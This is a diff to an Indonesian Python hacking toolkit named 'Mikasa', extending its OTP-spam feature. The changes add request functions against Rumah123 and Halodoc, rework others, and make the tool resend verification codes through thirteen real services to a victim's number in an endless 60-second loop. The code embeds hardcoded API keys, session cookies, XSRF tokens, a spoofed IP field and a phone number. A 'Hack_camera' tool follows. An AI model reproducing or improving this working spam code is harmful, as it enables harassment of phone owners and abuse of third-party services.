@@ -28,9 +28,8 @@ def check_update():
 
     print("[ + ] Tools Mikasa Update [ ! ]")
     print("Mengecek update terbaru...")
-
+    time.sleep(3)
     try:
-        # Pastikan remote 'origin' mengarah ke repo yang benar
         subprocess.run(["git", "remote", "set-url", "origin", REPO_URL],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
@@ -52,6 +51,7 @@ def check_update():
         print("[ ! ] Gagal cek update (tidak ada koneksi / repo error). Lanjut pakai versi lokal.\n")
     except FileNotFoundError:
         print("[ ! ] Git tidak ditemukan. Pastikan git sudah terinstall.\n")
+
 # ===================== WARNA =====================
 R = '\033[1;31m'
 G = '\033[1;32m'
@@ -108,7 +108,7 @@ def print_banner(user, date):
 
 {R}─────────────────────────────────────────────────────────────{N}
 {R}  {W}Author {N}›{W} Rulzz   Tools {N}›{W} 15   User {N}›{W} {user}{N}
-{R}  {W}Date  {N}›{W} {date}{N}
+{R}  {W}Date  {N}›{W} {date}{N}   {W}Version{N}›{W}1.0.0{N}
 {R}─────────────────────────────────────────────────────────────{N}
 
 {R}─────────────────────────────────────────────────────────────{N}
@@ -157,7 +157,7 @@ def tool_otp_spam():
     global cooldown_otp, stop_cooldown
     os.system('clear')
     
-    # Cek cooldown
+
     with cooldown_lock:
         sisa = cooldown_otp - time.time()
         if sisa > 0:
@@ -173,6 +173,7 @@ def tool_otp_spam():
             print(f"{R}─────────────────────────────────────────────────────────────{N}")
             print()
             
+            # Timer cooldown
             stop_cooldown = False
             for i in range(int(sisa), 0, -1):
                 if stop_cooldown:
@@ -180,6 +181,7 @@ def tool_otp_spam():
                 print(f"{Y}[⏳] Sisa {i} detik...{N}", end="\r")
                 time.sleep(1)
             
+            # Cek apakah user menekan ENTER untuk kembali
             import sys, select
             if select.select([sys.stdin], [], [], 0)[0]:
                 cmd = sys.stdin.readline().strip()
@@ -189,8 +191,12 @@ def tool_otp_spam():
             if not stop_cooldown:
                 print(f"{G}[✓] Cooldown selesai!{N}")
                 time.sleep(1)
+            # Kembali ke menu utama
+            print(f"{Y}[!] Kembali ke MIKASA...{N}")
+            time.sleep(1)
             return
     
+    # Tampilan utama OTP SPAM
     print(f"""
 {R}─────────────────────────────────────────────────────────────{N}
 {R}  {W}                                     {R}│{N}  {R}  -••••{N}
@@ -418,43 +424,46 @@ def tool_otp_spam():
     
     def spam_otp_saturdays(nomor):
      try:
-        if nomor.startswith("62"):
-            nomor_lokal = "0" + nomor[2:]
+        if nomor.startswith("0"):
+            nomor_lokal = nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor[2:]
         else:
             nomor_lokal = nomor
-
+        
+        session = requests.Session()
         url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
-
+        
         headers = {
-            "accept": "*/*",
-            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-            "authorization": "undefined",
-            "content-type": "application/json",
-            "country-code": "ID",
-            "currency-code": "IDR",
-            "device-type": "mweb",
-            "origin": "https://saturdays.com",
-            "referer": "https://saturdays.com/",
-            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
-            "sec-ch-ua-mobile": "?1",
-            "sec-ch-ua-platform": "Android",
-            "sec-fetch-dest": "empty",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-site": "same-site",
-            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
-            "platform": "mweb",
-            "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+            'Accept-Encoding': "gzip, deflate, br",
+            'Content-Type': "application/json",
+            'sec-ch-ua-platform': '"Android"',
+            'authorization': "undefined",
+            'device-type': "mweb",
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'x-api-key': "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
+            'sec-ch-ua-mobile': "?1",
+            'country-code': "ID",
+            'currency-code': "IDR",
+            'platform': "mweb",
+            'origin': "https://saturdays.com",
+            'sec-fetch-site': "same-site",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://saturdays.com/",
+            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            'priority': "u=1, i"
         }
-
+        
         payload = {
             "number": nomor_lokal,
             "country_code": "+62",
-            "type": ""
+            "type": "WHATSAPP"
         }
-
-        resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp.status_code == 200
-
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
      except:
         return False
     
@@ -498,12 +507,12 @@ def tool_otp_spam():
             'Accept-Encoding': "gzip, deflate, br",
             'x-request-id': "94b38767-7013-4b97-8315-fa99f54bb2d6",
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',  # FIX: vz -> v
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
             'x-channel-id': "MWEB",
             'sec-ch-ua-mobile': "?1",
             'x-lang': "id",
             'x-entity': "BLIBLI",
-            'content-type': "text/plain;charset=UTF-8",  # FIX: charsetz -> charset=
+            'content-type': "text/plain;charset=UTF-8",
             'x-client-id': "3ca1ed67701249861819ba4850f4f135",
             'origin': "https://account.bliblitiket.com",
             'sec-fetch-site': "same-origin",
@@ -522,7 +531,7 @@ def tool_otp_spam():
             "recaptchaToken": ""
         }
         
-        resp = session.post(url, json=payload, headers=headers, timeout=10)  # FIX: jsonz -> json=, headersz -> headers=, timeoutz -> timeout=
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False       
@@ -538,29 +547,29 @@ def tool_otp_spam():
         
         import random
         import string
-        random_email = f"user{random.randint(100000,999999)}@gmail.com"      # FIX: z -> =
-        random_name = f"User{random.randint(100,999)}"                       # FIX: z -> =
-        random_password = ''.join(random.choices(string.ascii_letters + string.digits + "._", k=16))  # FIX: kz -> k=
+        random_email = f"user{random.randint(100000,999999)}@gmail.com"
+        random_name = f"User{random.randint(100,999)}"
+        random_password = ''.join(random.choices(string.ascii_letters + string.digits + "._", k=16))
         
-        session = requests.Session()           # FIX: z -> =
-        url = "https://matahari-backend-prod.matahari.com/api/auth/register"  # FIX: z -> =
+        session = requests.Session()
+        url = "https://matahari-backend-prod.matahari.com/api/auth/register"
         
         headers = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
-            'Accept-Encoding': "gzip, deflate, br",  # Hapus zstd biar ga error
+            'Accept-Encoding': "gzip, deflate, br",
             'Content-Type': "application/json",
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',  # FIX: vz -> v=
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
             'sec-ch-ua-mobile': "?1",
             'Origin': "https://matahari.com",
             'Sec-Fetch-Site': "same-site",
             'Sec-Fetch-Mode': "cors",
             'Sec-Fetch-Dest': "empty",
             'Referer': "https://matahari.com/",
-            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"  # FIX: qz -> q=
+            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
         }
         
-        payload = {                                                        # FIX: z -> =
+        payload = {
             "emailAddress": random_email,
             "name": random_name,
             "mobileCountryCode": "",
@@ -575,79 +584,174 @@ def tool_otp_spam():
             "marketingCode": ""
         }
         
-        resp = session.post(url, json=payload, headers=headers, timeout=10)  # FIX: jsonz -> json=, headersz -> headers=, timeoutz -> timeout=
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
       except:
         return False
 
-    apis = {
-        "1": spam_otp_adiraku,
-        "2": spam_otp_tokopedia,
-        "3": spam_otp_singa,
-        "4": spam_otp_pinhome,
-        "5": spam_otp_duniagames,
-        "6": spam_otp_acc,
-        "7": spam_otp_absenku,
-        "8": spam_otp_saturdays,
-        "9": spam_otp_maulagi,
-        "10": spam_otp_bliblitiket,
-        "11": spam_otp_matahari
-    }
-    
-    hasil = {}
-    with ThreadPoolExecutor(max_workers=len(apis)) as executor:
-        futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
-        for future in as_completed(futures):
-            nama = futures[future]
-            try:
-                hasil[nama] = future.result()
-            except:
-                hasil[nama] = False
-    
-    berhasil = sum(1 for v in hasil.values() if v)
-    gagal = len(hasil) - berhasil
-    
-    print(f"{G}─────────────────────────────────────────────────────────────{N}")
-    print(f"{G}  HASIL PENGIRIMAN OTP{N}")
-    print(f"{G}─────────────────────────────────────────────────────────────{N}")
-    print(f"  {W}Total {G}Berhasil {W}: {G}{berhasil}{N}")
-    print(f"  {W}Total {R}Gagal   {W}: {R}{gagal}{N}")
-    print(f"{G}─────────────────────────────────────────────────────────────{N}")
-    
-    # SET COOLDOWN 60 DETIK
-    with cooldown_lock:
-        cooldown_otp = time.time() + 60
-    
-    print(f"""{Y} 
+    def spam_otp_rumah123(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://www.rumah123.com/api/otp/request-otp"
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+            'Accept': "application/json, text/plain, */*",
+            'Accept-Encoding': "gzip, deflate, br",
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'content-type': "application/json;charset=UTF-8",
+            'sec-ch-ua-mobile': "?1",
+            'base-url-core': "https://www.rumah123.com",
+            'origin': "https://www.rumah123.com",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-dest': "empty",
+            'referer': "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/",
+            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            'priority': "u=1, i",
+            'Cookie': "ajs_anonymous_id=962b0766-64e4-493c-ae48-e59524822742; _ga=GA1.1.533350590.1780038198; _fbp=fb.1.1780038199360.807614422108834462; _tt_enable_cookie=1; _ttp=01KSS8PT9AQ=2N85JA4NBZ289F_.tt.1; __gads=ID=6ca90e1a33b998e9:T=1780045927:RT=1780045927:S=ALNI_Mb48=zdld8fUzNTj2mKtzcuQteMfQ; __gpi=UID=000014381fc3b087:T=1780045927:RT=1780045927:S=ALNI_MbWUjDmbUHcU-lmpT4CdYzH88d6yw; __eoi=ID=c85668bfa6f5416c:T=1780045927:RT=1780045927:S=AA-AfjZDUEoWxpdAvxXN4ehDANSQ; enquiry_data={\"email\":\"Jokowi@gmail.com\",\"isEverTickMortgage\":false,\"isVerified\":false,\"name\":\"Bray\",\"otpExpiredTime\":1780046220580,\"phoneNumber\":\"6285757102633\",\"requestOTPTime\":1780048557646}; 99group=s%3Accfa8db0-50f5-4e86-8aeb-35622f2b2cc0.G%2FYccepBgrnc6CJZvAPejEIwPe0jzpnoIjF3bvdL35s; _cfuvid=JIxmpGlboMHKgIlCU_H9Oc5=kw9ZYv9H8Mgr0B2FOec-1780182128.8329046-1.0.1.1-hIBwtBRvNB1Bv5_PsQGgwwAgoLU8KCBhSa6g9Abs9.Q; _clck=1n8grzt%5E2%5Eg6h%5E0%5E2340; flag_data={\"showAppsDownloadBanner\":true}; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%22e1507b7e-d15b-40ef-b408-d0cc88941c59%5C%22%2C%5B1780038190%2C882000000%5D%5D%22%5D%5D%5D; segment-utm=eyJpdG1fbWkaX=tIjoiIiwiaXRtX3NvdXJjZSI6IiIsInBhZ2=fcm=mZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInNlc3Npb25fY291bnQiOjMsInNlc3Npb25fcm=mZXJyZXIiOjE3ODAxODIxMzE0MTIsInRpbW=zdGFtcCI6MTc4MDE4MjE3MDg0OSwidXRtX2NhbXBhaWduIjoiIiwidXRtX21lZGl1bSI6IiIsIn=0b=9zb3=yY2UiOiIifQzz; FCNEC=%5B%5B%22AKsRol-ufo=7rjU2mcoI=kLK9e4X2SajLpPwjup6Os7MDD0gzmh_Cgps6b5CUxPAUD9eSXrKUE0ClyvIK2CkIZkYxujk5vOnGmDR050J8xB26-Hqp6hvMh1wYxihBBen1G3_ysUKac0FyaTTkRoQ-ZefR2bi6ko8TA%3D%3D%22%5D%5D; _ga_D5=06TRY2RzGS2.1.s1780182173$o4$g0$t1780182173$j60$l0$h0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22WHnraPibWLKLluimE5Gw%22%2C%22expiryDate%22%3A%222027-05-30T23%3A02%3A54.553Z%22%7D; ttcsid=1780182175610::ron=FY0wjKCEa72LL2gJ.4.1780182182816.0::1.-37243.0::7090.2.285.885::0.0.0; ttcsid_C2OBT2A3E7AM6FQ8BMMG=1780182175601::NBtm-TUK-lurT5Q-Kl19.4.1780182182817.0; _ga_Z36X54E7Z5=GS2.1.s1780182173$o4$g0$t1780182182$j51$l0$h0; _gcl_au=1.1.950890321.1780038193.1925756783.1780182179.1780182183"
+        }
+        
+        payload = {
+            "ipAddress": f"140.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+            "phoneNumber": nomor_lokal,
+            "portalId": 1,
+            "type": "WHATSAPP",
+            "url": "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+       
+    def spam_otp_halodoc(nomor):
+     try:
+        if nomor.startswith("0"):
+            nomor_lokal = "62" + nomor[1:]
+        elif nomor.startswith("62"):
+            nomor_lokal = nomor
+        else:
+            nomor_lokal = "62" + nomor
+        
+        session = requests.Session()
+        url = "https://customers.api.halodoc.com/magneto-api/v2/users/authentication/otp/requests"
+        
+        headers = {
+            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+            'Accept': "application/json, text/plain, */*",
+            'Accept-Encoding': "gzip, deflate, br",
+            'Content-Type': "application/json",
+            'sec-ch-ua-platform': '"Android"',
+            'X-XSRF-TOKEN': "E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9",
+            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'sec-ch-ua-mobile': "?1",
+            'Origin': "https://www.halodoc.com",
+            'Sec-Fetch-Site': "same-site",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Dest': "empty",
+            'Referer': "https://www.halodoc.com/",
+            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            'Cookie': "rx=isitorrwlrur9lz1780208322401=UP888O9A=FOLNR8R0HR3389UTPU62HD; dtSarwlrur9lz-; _gcl_au=1.1.1758244023.1780208325; _ga=GA1.1.51880007.1780208328; rxvtrwlrur9lz1780210130688|1780208322422; dtPCrwlrur9lz5$8322365_313h32vHSWFLANATLPCNEMPCUQHAFKRGRTPDUTW-0e0; dtCookierwlrur9lzv_4_srv_5_sn_85FE102AE029FEC31922E56941139E18_app-3Ae28137e9070184e7_0_app-3Aea7c4b59f27d43eb_0_ol_0_perc_100000_mul_1_rcs-3Acss_0; afUserId=69040147-6a0d-47d5-8454-8d920230c2f0-p; AF_SYNC=1780208331597; WZRK_Gz=f8f4004de684498e9aea0d16dcfc99d4; WZRK_S_WR9-ZRZ-9W7Z=%7B%22p%22%3A1%2C%22s%22%3A1780208334%2C%22t%22%3A1780208334%7D; _ga_02NBJNEK=HGS2.1.s1780208328$o1$g0$t1780208338$j50$l0$h0; XSRF-TOKEN=E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9"
+        }
+        
+        payload = {
+            "phone_number": f"+{nomor_lokal}",
+            "channel": "whatsapp",
+            "otp_resent": False,
+            "clientId": "4dccb45a031542ad01fd22931238c909"
+        }
+        
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+     except:
+        return False
+
+    while True:
+
+        apis = {
+            "1": spam_otp_adiraku,
+            "2": spam_otp_tokopedia,
+            "3": spam_otp_singa,
+            "4": spam_otp_pinhome,
+            "5": spam_otp_duniagames,
+            "6": spam_otp_acc,
+            "7": spam_otp_absenku,
+            "8": spam_otp_saturdays,
+            "9": spam_otp_maulagi,
+            "10": spam_otp_bliblitiket,
+            "11": spam_otp_matahari,
+            "12": spam_otp_rumah123,
+            "13": spam_otp_halodoc
+        }
+        
+        hasil = {}
+        with ThreadPoolExecutor(max_workers=len(apis)) as executor:
+            futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
+            for future in as_completed(futures):
+                nama = futures[future]
+                try:
+                    hasil[nama] = future.result()
+                except:
+                    hasil[nama] = False
+        
+        berhasil = sum(1 for v in hasil.values() if v)
+        gagal = len(hasil) - berhasil
+        
+        print(f"{G}─────────────────────────────────────────────────────────────{N}")
+        print(f"{G}  HASIL PENGIRIMAN OTP{N}")
+        print(f"{G}─────────────────────────────────────────────────────────────{N}")
+        print(f"  {W}Total {G}Berhasil {W}: {G}{berhasil}{N}")
+        print(f"  {W}Total {R}Gagal   {W}: {R}{gagal}{N}")
+        print(f"{G}─────────────────────────────────────────────────────────────{N}")
+        
+        # Set cooldown 60 detik
+        with cooldown_lock:
+            cooldown_otp = time.time() + 60
+        
+        print(f"""{Y} 
 █▀ █▀█ █░ █▀▄ █▀█ █░█░█ █▄░█
 █▄ █▄█ █▄ █▄▀ █▄█ ▀▄▀▄▀ █░▀█ {N}""")
-    print(f"{Y}[!] Tekan ENTER untuk kembali ke MIKASA{N}")
-    print()
-    
-    # Timer mundur dengan opsi ENTER untuk kembali
-    stop_cooldown = False
-    for i in range(60, 0, -1):
-        if stop_cooldown:
-            break
-        # Cek input tanpa blocking (hanya untuk ENTER)
-        import sys, select
-        if select.select([sys.stdin], [], [], 0)[0]:
-            cmd = sys.stdin.readline().strip()
-            if cmd == "":
-                stop_cooldown = True
-                break
+        print(f"{Y}[!] Cooldown 60 detik. Kirim otomatis ulang setelah selesai.{N}")
+        print(f"{Y}[!] Tekan ENTER untuk kembali ke MIKASA (keluar dari spam){N}")
+        print()
         
-        print(f"{Y}[⏳] Sisa {i} detik... (Tekan ENTER untuk kembali){N}", end="\r")
+        # Timer cooldown dengan deteksi ENTER
+        stop_cooldown = False
+        import sys, select
+        
+        for i in range(60, 0, -1):
+            if stop_cooldown:
+                break
+            # Cek input tanpa blocking
+            if select.select([sys.stdin], [], [], 0)[0]:
+                cmd = sys.stdin.readline().strip()
+                if cmd == "":
+                    stop_cooldown = True
+                    break
+            
+            print(f"{Y}[⏳] Sisa {i} detik... (Tekan ENTER untuk kembali){N}", end="\r")
+            time.sleep(1)
+        
+        print("\n" + " " * 70 + "\r", end="")
+        
+        if stop_cooldown:
+            print(f"{Y}[!] Kembali ke MIKASA...{N}")
+            time.sleep(1)
+            break
+        
+        # Jika tidak ditekan ENTER, lanjut spam lagi
+        print(f"{G}[✓] Cooldown selesai! Mengirim ulang OTP...{N}\n")
         time.sleep(1)
-    
-    print("\n" + " " * 70 + "\r", end="")
-    
-    if not stop_cooldown:
-        print(f"{G}[✓] Cooldown selesai!{N}")
-        time.sleep(1)
-    
-    print(f"{Y}[!] Kembali ke MIKASA...{N}")
-    time.sleep(1)
+        # Loop berlanjut ke spam berikutnya
     
 def tool_Hack_camera():
     os.system('clear')
